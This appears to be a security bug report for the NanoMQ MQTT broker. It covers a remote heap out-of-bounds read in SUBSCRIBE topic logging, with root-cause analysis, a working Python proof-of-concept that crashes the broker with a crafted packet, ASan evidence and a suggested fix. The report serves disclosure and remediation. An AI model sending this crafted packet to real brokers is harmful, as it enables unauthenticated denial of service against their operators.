# NanoMQ v0.24.10-14 `SUBSCRIBE` Topic Logging: Heap Buffer Overflow Read in `nmq_subinfo_decode`

## Describe the bug

A remote client can crash NanoMQ by sending a crafted MQTT `SUBSCRIBE` packet whose topic bytes are not NUL-terminated inside the message buffer. The broker logs the topic using `%s` directly from the network buffer. Because MQTT strings are length-prefixed (not NUL-terminated), `printf` continues reading past the end of the message buffer until a `\0` is encountered, triggering a heap out-of-bounds read and broker abort under ASan.

This is a remote unauthenticated Denial-of-Service condition.

## Functional Background (MQTT `SUBSCRIBE` Topic Logging Path)

For each topic entry in the `SUBSCRIBE` payload, NanoMQ:

1. reads the topic length
2. validates that the topic bytes fit in the message
3. logs the topic for debugging
4. then parses the subscription options byte

The topic bytes are length-prefixed; they are not guaranteed to be NUL-terminated.

## Root Cause Analysis

### 1) TCP receive allocates the MQTT body using attacker-controlled Remaining Length

- file: `nng/src/sp/transport/mqtt/broker_tcp.c:791`
- function: `tcptran_pipe_recv_cb`
- behavior: `nni_msg_alloc(&p->rxmsg, (size_t) len)`

### 2) `nmq_subinfo_decode` logs topic bytes as a C string

- file: `nng/src/sp/protocol/mqtt/mqtt_parser.c:1756`
- function: `nmq_subinfo_decode`
- code:

```
log_trace("The current process topic is %s", payload_ptr + bpos);
```

`payload_ptr + bpos` points into the MQTT payload, which is not NUL-terminated. Using `%s` causes `vfprintf` to keep reading until it finds a `\0`, which can go beyond the heap buffer allocated for the message body.

### 3) ASan crash lands in `printf_common` through `stdout_callback`

On the ASan build, the malformed packet produces:

- `READ of size ...`
- top frame: `printf_common` via `stdout_callback`
- call path: `log_log -> nmq_subinfo_decode`
- allocated region: exact `nni_msg_alloc` buffer

This confirms a real heap out-of-bounds read.

## Expected behavior

The broker should safely log the topic bytes using a length-limited format or avoid treating binary MQTT strings as NUL-terminated C strings.

## Actual behavior

When a crafted `SUBSCRIBE` is sent:

1. the broker accepts a valid `CONNECT`
2. it receives the `SUBSCRIBE`
3. `log_trace` prints the topic using `%s`
4. `vfprintf` reads past the heap buffer end
5. the ASan-instrumented broker aborts with `heap-buffer-overflow`

## To Reproduce

### 1) Start NanoMQ with the ASan build

```bash
build-asan-gcov/nanomq/nanomq start --log_level debug --log_stdout true
```

### 2) Run the following Python PoC

```python
#!/usr/bin/env python3
import socket
import time

HOST = "127.0.0.1"
PORT = 1883

# MQTT 3.1.1 CONNECT, clientid="poc"
connect = bytes.fromhex(
    "10 0f"
    "00 04 4d 51 54 54"
    "04"
    "02"
    "00 3c"
    "00 03 70 6f 63"
)

# Crafted SUBSCRIBE:
#   Remaining Length = 1024 (0x80 0x08)
#   packet id        = 0x0001
#   topic length     = 1020 (0x03fc)
#   topic body       = "A" * 1020 (no NUL)
#   options byte     = 0x01 (non-zero, ensures no early NUL)
body = b"\x00\x01" + b"\x03\xfc" + (b"A" * 1020) + b"\x01"
sub = b"\x82\x80\x08" + body

with socket.create_connection((HOST, PORT), timeout=3) as s:
    s.sendall(connect)
    s.recv(8)
    time.sleep(0.1)
    s.sendall(sub)
    time.sleep(0.5)
```

### 3) Expected crash evidence

Expected ASan symptom:

- `heap-buffer-overflow`
- top frame in `printf_common` / `stdout_callback`
- call path: `log_log -> nmq_subinfo_decode`

![image-20260414154230122](C:\Users\Administrator\Desktop\RuoyuZhou\bug_reports\assets\image-20260414154230122.png)

## Environment Details

- NanoMQ version:
  - `v0.24.10-14` (from `nanomq/include/version.h`)
  - workspace commit: `0a3c709b2eafd23e05a837ea2e4ce87c6b7ad19d`
- Operating system and version:
  - Linux `5.10.102.1-microsoft-standard-WSL2` x86_64
- Compiler and language used:
  - `cc (Ubuntu 11.4.0-1ubuntu1~22.04) 11.4.0`
  - `c++ (Ubuntu 11.4.0-1ubuntu1~22.04) 11.4.0`
  - Language: C (NanoMQ), Python (PoC)
- testing scenario:
  - ASan-instrumented build (`build-asan-gcov`)
  - TCP listener on `127.0.0.1:18883`
  - one valid MQTT `CONNECT`
  - one crafted `SUBSCRIBE` with exact `Remaining Length = 1024`

## Client SDK

- No MQTT SDK is required.
- Reproduction uses a raw Python socket client that sends exact packet bytes.
- This keeps the trigger deterministic and avoids client-library normalization.

## Suggested fix

Use length-limited logging for MQTT strings:

```
log_trace("The current process topic is %.*s", (int) len_of_topic, payload_ptr + bpos);
```

This prevents `printf` from reading beyond the buffer regardless of content.
